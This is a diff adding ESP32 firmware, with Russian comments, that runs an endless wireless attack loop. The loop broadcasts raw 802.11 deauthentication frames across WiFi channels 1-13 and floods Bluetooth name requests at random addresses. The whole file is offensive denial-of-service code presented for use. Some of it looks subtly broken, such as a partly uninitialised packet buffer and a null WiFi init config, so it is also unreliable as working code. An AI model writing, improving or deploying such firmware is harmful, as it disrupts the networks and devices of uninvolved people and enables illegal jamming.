@@ -1,0 +1,145 @@
+#include "esp_wifi.h"
+#include "esp_bt.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "driver/gpio.h"
+#include "esp_task_wdt.h"
+#include "esp_timer.h"
+
+#define LED_PIN 2
+
+// Защищенные глобальные переменные
+static volatile uint8_t system_ok = 1;
+
+// СУПЕР-быстрый deauth (оптимизированный)
+static const uint8_t DEAUTH_RAW[] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+
+// Защищенная WiFi атака
+void safe_wifi_attack() {
+    if(!system_ok) return;
+    
+    static uint8_t channel = 1;
+    esp_wifi_set_channel(channel, 0);
+    
+    // Быстрая отправка (без лишних копий)
+    uint8_t packet[26];
+    memcpy(packet, DEAUTH_RAW, 10);
+    packet[24] = 0x01; // Reason code
+    
+    for(int i=0; i<3; i++) { // 3 пакета на канал
+        esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
+        vTaskDelay(5 / portTICK_PERIOD_MS);
+    }
+    
+    channel = (channel % 13) + 1; // Цикл по каналам 1-13
+}
+
+// Защищенная Bluetooth атака
+void safe_bt_attack() {
+    if(!system_ok) return;
+    
+    static uint32_t last_bt = 0;
+    uint32_t now = esp_timer_get_time() / 1000;
+    
+    if(now - last_bt > 100) { // Раз в 100мс
+        esp_bd_addr_t mac = {
+            rand()&0xFF, rand()&0xFF, rand()&0xFF,
+            rand()&0xFF, rand()&0xFF, rand()&0xFF
+        };
+        esp_bt_gap_read_remote_name(mac);
+        last_bt = now;
+    }
+}
+
+// Монитор системы (сторожевой пёс)
+void system_monitor(void* arg) {
+    while(1) {
+        // Проверка памяти
+        if(esp_get_free_heap_size() < 30000) {
+            vTaskDelay(1000 / portTICK_PERIOD_MS); // Пауза при нехватке памяти
+        }
+        
+        // Сброс watchdog
+        esp_task_wdt_reset();
+        
+        vTaskDelay(500 / portTICK_PERIOD_MS);
+    }
+}
+
+// Инициализация с защитой
+void safe_init() {
+    // 1. Настройка пинов
+    gpio_set_direction(LED_PIN, GPIO_MODE_OUTPUT);
+    
+    // 2. Включаем watchdog
+    esp_task_wdt_init(5, true); // Таймаут 5 секунд
+    
+    // 3. WiFi (минимальная конфигурация)
+    esp_wifi_init(NULL);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    esp_wifi_start();
+    vTaskDelay(100 / portTICK_PERIOD_MS);
+    
+    // 4. Bluetooth (если не инициализируется - пропускаем)
+    if(esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_IDLE) {
+        esp_bt_controller_init(NULL);
+        vTaskDelay(50 / portTICK_PERIOD_MS);
+        esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
+    }
+}
+
+void app_main() {
+    // Быстрое мигание при запуске
+    for(int i=0; i<10; i++) {
+        gpio_set_level(LED_PIN, i%2);
+        vTaskDelay(100 / portTICK_PERIOD_MS);
+    }
+    
+    // Безопасная инициализация
+    safe_init();
+    
+    // Запуск монитора
+    xTaskCreate(system_monitor, "monitor", 2048, NULL, 10, NULL);
+    
+    // Пауза перед атакой
+    vTaskDelay(500 / portTICK_PERIOD_MS);
+    
+    // Регистрируем главную задачу в watchdog
+    esp_task_wdt_add(NULL);
+    
+    // ====== БЕСКОНЕЧНЫЙ ЦИКЛ АТАКИ ======
+    uint32_t loop_counter = 0;
+    
+    while(1) {
+        // Чередуем атаки
+        switch(loop_counter++ % 4) {
+            case 0:
+                safe_wifi_attack();
+                break;
+            case 1:
+                safe_bt_attack();
+                break;
+            case 2: // Пауза и мигание
+                gpio_set_level(LED_PIN, 1);
+                vTaskDelay(20 / portTICK_PERIOD_MS);
+                gpio_set_level(LED_PIN, 0);
+                break;
+            case 3: // Проверка памяти
+                if(esp_get_free_heap_size() < 25000) {
+                    vTaskDelay(100 / portTICK_PERIOD_MS);
+                }
+                break;
+        }
+        
+        // ВСЕГДА даём управление другим задачам
+        esp_task_wdt_reset(); // Сбрасываем watchdog
+        vTaskDelay(1 / portTICK_PERIOD_MS); // Минимальная пауза
+        
+        // Автосброс каждые 10000 циклов
+        if(loop_counter > 10000) {
+            vTaskDelay(100 / portTICK_PERIOD_MS);
+            loop_counter = 0;
+        }
+    }
+}
